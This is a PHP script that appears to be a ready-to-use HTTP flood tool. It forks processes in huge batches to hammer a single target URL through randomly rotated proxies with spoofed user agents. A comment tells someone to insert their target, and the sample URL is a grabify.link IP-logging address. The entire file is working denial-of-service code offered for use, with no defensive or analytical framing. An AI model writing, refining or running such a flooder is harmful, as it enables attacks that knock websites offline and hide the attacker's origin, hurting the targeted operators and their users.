<?php
$proxyFile = 'liveproxy.txt';
$proxies = file($proxyFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$url = "https://grabify.link/T3CS3I"; // HI GHOST TARGET URL PUT HERE.

$maxConcurrentRequests = 1000000;
$totalBatches = 1000;

$userAgentFile = 'useragent.txt';
$userAgents = file($userAgentFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$activeChildren = 0;
$completed = 0;

for ($batch = 0; $batch < $totalBatches; $batch++) {
    for ($i = 0; $i < $maxConcurrentRequests; $i++) {
        $proxyUrl = $proxies[array_rand($proxies)];
        $proxy = explode(':', $proxyUrl);

        $pid = pcntl_fork();

        if ($pid == -1) {
            die("Fork failed.");
        } elseif ($pid == 0) {
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
            $userAgent = $userAgents[array_rand($userAgents)];
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
            curl_setopt($ch, CURLOPT_NOBODY, true);

            curl_exec($ch);

            $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            echo "Batch " . ($batch + 1) . " - Request " . ($i + 1) . " - Status code: " . $statusCode . "\n";

            curl_close($ch);
            exit(0);
        } else {

            $activeChildren++;

            if ($activeChildren >= $maxConcurrentRequests) {
                pcntl_wait($status);
                $activeChildren--;
            }
        }
    }
}

while ($activeChildren > 0) {
    pcntl_wait($status);
    $activeChildren--;
}
?>
